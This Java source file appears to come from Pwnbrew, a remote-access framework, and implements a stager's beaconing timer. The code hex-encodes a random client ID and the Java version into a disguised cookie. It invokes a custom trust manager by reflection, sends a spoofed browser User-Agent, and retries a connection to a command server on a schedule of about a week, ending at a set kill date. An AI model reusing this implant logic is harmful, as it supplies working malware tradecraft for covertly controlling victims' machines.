/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

/*
 *  SleepTimer.java
 *
 *  Created on November 6, 2013
 */

package stager;

import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.security.SecureRandom;
import java.util.Calendar;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;
import java.util.Timer;
import java.util.TimerTask;
import static stager.Stager.hexArray;
/**
 *
 */
public class SleepTimer implements Runnable {
    
    //Static instance
    private final Queue<Date> theReconnectTimeList = new LinkedList<Date>();
    private final String decodedURL;
    private URLConnection theConnection = null;
    private InputStream theInputStream = null;
    private byte[] theClientId;
    private Date deathDateCalendar = null;
    private Date initialSleepDate = new Date();
    
    private volatile boolean notified = false;
 
    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedURL
    */
    public SleepTimer( String passedURL ) {   
        decodedURL = passedURL;
    }
    
    // ==========================================================================
    /**
     *  Main thread loop
     *
    */
    @Override
    public void run() {
            
        Calendar theCalendar = Calendar.getInstance(); 
        theCalendar.setTime( initialSleepDate );
        theCalendar.add(Calendar.SECOND, 5 );
        Date theDate = theCalendar.getTime();        
                
        //Generate a random id
        SecureRandom aSR = new SecureRandom();
        theClientId = new byte[4];
        aSR.nextBytes(theClientId);
        String randStr = bytesToHex( theClientId );
        
        //String aStr = "50574E5A6E574E5A50A8B1A5AF574E5A5057642A27392C283520603435233935223C60393F393A283F3B603735243D3B37323D740332203E03232F3D35";
        //String aStr = "08574E5A6E574E5A50A8B1A5AF574E5A5057642A27392C283520603435233935223C60393F393A283F3B603735243D3B37323D740332203E03232F3D35";
//      String aStr = "50574E5A42574E5A50A8B1A5AF574E5A50";
        String aStr = "50574E5A42574E5A50A8B1A5AF574E5A42";
        String beginStr = aStr.substring(0, 10);
        String endStr = aStr.substring(18);
                              
        //Print after
        StringBuilder aSB = new StringBuilder().append(beginStr).append(randStr).append(endStr);
        
        //Get the java version
        String theVersion = System.getProperty("java.version");
        if( theVersion != null && !theVersion.isEmpty() && theVersion.length() > 2 ){
            
            aSB.append("474E5A5056");
            char theChar = theVersion.charAt(2);
            switch( theChar ){
                case '4':
                    aSB.append("7A");
                    break;
                case '5':
                    aSB.append("7B");
                    break;
                case '6':
                    aSB.append("78");
                    break;
                case '7':
                    aSB.append("79");
                    break;
                case '8':
                    aSB.append("76");
                    break;
                default:
                    aSB.append("00");
                    break;
            }
        }
        
        //Get a hex string representation
        String encodedByteStr = aSB.toString().replace(" ", "");
        aSB = new StringBuilder()
                .append("zrefx").append("=").append( encodedByteStr );

        //Reconnect list
        generateTimes();
        
        while( theConnection == null ){

            //Get the reconnect time from the list
            if( theDate != null ){

                //check if the time is before now
                Calendar anotherCalendar = Calendar.getInstance(); 
                anotherCalendar.setTime( theDate );

                if( !anotherCalendar.before( new Date())){
                     
                    waitUntil(theDate);  
                    try {

                        //Create the connection
                        theConnection = new URL( decodedURL ).openConnection();
                        StagerTrustManager.class.getMethod("setTrustManager", 
                              new Class[] { URLConnection.class }).invoke(null, new Object[] { theConnection });

                        //Set the cookie
                        theConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
                        theConnection.setRequestProperty("Accept-Language", "en-us, en;q=0.5");
                        theConnection.setRequestProperty("Cookie", aSB.toString());

                        //Try to connect
                        theInputStream = theConnection.getInputStream();   
                        
                        LoaderUtilities.updateKillTime( null );

                    } catch ( IOException ex) {
                        theConnection = null;
                    } catch ( Exception ex) {
                        theConnection = null;
                        break;
                    } 
                    
                    //Reset the reconnect time
                    theDate = null;  

                }             

            } else {
                break;
            }  
            
            //Get the next date
            if( theConnection == null ){
                synchronized(theReconnectTimeList){
                    theDate = theReconnectTimeList.poll();
                }
            }

        }  
        
        theReconnectTimeList.clear();
        
    }
    
    // ==========================================================================
    /**
     *  Wait until a certain date to reconnect
     * 
     * @param date 
     */
    private void waitUntil(Date date) {
        
        TimerTask aTimerTask = new TimerTask() {
            @Override
            public void run() {
                beNotified();
            }
        };
        
        System.out.println( "Trying to connect again at " + date.toString());
        
        //Create a timer
        Timer aTimer = new Timer();
        aTimer.schedule(aTimerTask, date);
        waitToBeNotified();

        aTimer.cancel();
        aTimer.purge();
    }

    // ==========================================================================
    /**
     *  Sets the delay to wait before trying to connect.
     * 
     * @param passedTime 
    */
    public void addReconnectTime( Date passedTime ) {
        
        if( deathDateCalendar != null && deathDateCalendar.before( passedTime ))
            return;        
        
        synchronized(theReconnectTimeList){
            theReconnectTimeList.add( passedTime );
        }
    }
    
    //===============================================================
    /**
     *  Returns the connection if one was established.
     * @return 
     */
    public URLConnection getUrlConnection() {
        return theConnection;
    }
    
     //===============================================================
    /**
     *  Get the client id that was generated.
     * @return 
     */
    public byte[] getClientId() {
        return theClientId;
    }
    
    //===============================================================
    /**
     *  Returns the input stream.
     * @return 
     */
    public InputStream getInputStream() {
        return theInputStream;
    }
    
    //===============================================================
    /**
     * 
     */
    private void generateTimes(){
                
        //Create the calendar
        Calendar theCalendar = Calendar.getInstance(); 
        theCalendar.setTime( initialSleepDate );

        //Add 1 Minute
        theCalendar.add( Calendar.MINUTE, 2);
        Date aTime = theCalendar.getTime();

        //Format and add to the queue
        addReconnectTime(aTime);
        
        //Add 5 Mins
        theCalendar.add( Calendar.MINUTE, 5);
        aTime = theCalendar.getTime();

        //Format and add to the queue
        addReconnectTime(aTime);

        //Add 10 Mins
        theCalendar.add( Calendar.MINUTE, 10);
        aTime = theCalendar.getTime();

        //Format and add to the queue
        addReconnectTime(aTime);

        //Add 15 Mins
        theCalendar.add( Calendar.MINUTE, 15);
        aTime = theCalendar.getTime();

        //Format and add to the queue
        addReconnectTime(aTime);

        for( int i= 0; i < 7 * 23; i++ ){

            theCalendar.add( Calendar.HOUR_OF_DAY, 1 );
            aTime = theCalendar.getTime();

            //Format and add to the queue
            addReconnectTime(aTime);

        }
        
        //Set the death time
        if( deathDateCalendar == null )
            LoaderUtilities.updateKillTime( aTime );

    }
    
    // ==========================================================================
    /**
     *  Hex encode the string
     * 
     * @param bytes
     * @return 
    */
    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        int v;
        for ( int j = 0; j < bytes.length; j++ ) {
            v = bytes[j] & 0xFF;
            hexChars[j * 2] = hexArray[v >>> 4];
            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
        }
        return new String(hexChars);
    }

    // ==========================================================================
    /**
     * 
     * @param tmpDate 
     */
    public void setDeathDate(Date tmpDate) {
        //Create the calendar
        deathDateCalendar = new Date(tmpDate.getTime());
    }

    // ==========================================================================
    /**
     * 
     * @param tmpDate 
     */
    public void setIntialSleepDate(Date tmpDate) {
        initialSleepDate = tmpDate;
    }
    
     //===============================================================
    /**
     * Notifies the thread
    */
    protected synchronized void beNotified() {
        notified = true;
        notifyAll();
    }
    
    // ==========================================================================
    /**
    * Causes the calling {@link Thread} to <tt>wait()</tt> until notified by
    * another.
    * <p>
    * <strong>This method most certainly "blocks".</strong>
     * @param anInt
    */
    protected synchronized void waitToBeNotified( Integer... anInt ) {

        while( !notified ) { //Until notified...

            try {
                
                //Add a timeout if necessary
                if( anInt.length > 0 ){
                    
                    wait( anInt[0]);
                    break;
                    
                } else {
                    wait(); //Wait here until notified
                }
                
            } catch( InterruptedException ex ) {
                continue;
            }

        }
        notified = false;
    }
   
}
